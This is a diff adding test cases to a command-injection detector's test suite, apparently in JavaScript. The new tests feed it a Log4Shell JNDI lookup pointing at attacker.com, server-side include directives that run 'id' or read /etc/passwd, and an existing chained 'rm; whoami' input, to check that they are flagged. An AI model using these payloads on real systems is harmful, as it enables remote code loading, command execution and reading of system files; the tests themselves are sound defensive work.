@@ -167,6 +167,18 @@ describe('detectCommandInjection', () => {
     expect(detectCommandInjection('rm file.txt; whoami')).toBe(true);
   });
 
+  it('should detect JNDI lookup (Log4Shell)', () => {
+    expect(detectCommandInjection('${jndi:ldap://attacker.com/a}')).toBe(true);
+    expect(detectCommandInjection('${JNDI:dns://x}')).toBe(true);
+  });
+
+  it('should detect server-side include directives', () => {
+    expect(detectCommandInjection('<!--#exec cmd="id"-->')).toBe(true);
+    expect(detectCommandInjection('<!--#include virtual="/etc/passwd"-->')).toBe(true);
+    // A benign comment without a directive keyword is not flagged.
+    expect(detectCommandInjection('<!-- #note: see below -->')).toBe(false);
+  });
+
   it('should return false for safe input', () => {
     expect(detectCommandInjection('document.txt')).toBe(false);
   });
